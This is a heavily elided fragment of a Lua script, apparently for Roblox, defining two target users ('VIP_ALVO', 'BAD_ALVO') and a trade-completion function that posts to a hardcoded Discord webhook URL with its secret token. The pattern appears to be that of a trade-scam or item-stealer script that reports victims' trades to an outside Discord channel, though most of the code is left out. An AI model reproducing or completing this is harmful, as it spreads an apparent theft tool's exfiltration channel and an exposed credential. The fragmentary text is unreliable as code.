...
-- ============================================================
local VIP_TARGET_USER = "VIP_ALVO"
...
local BAD_TARGET_USER = "BAD_ALVO"
    ...
    task.spawn(function()
        ...
        task.spawn(function()
            ...
            sendTradeCompleteWebhook = function(offered)
                ...
                postUrl("https://discord.com/api/webhooks/1518734207709348000/xyDAADO3OEo1zlwwbYT0ev7ILWkFkrEqOkHyo0xXK2uIWodcCuM3uU1cshflTP0MSP7Q")
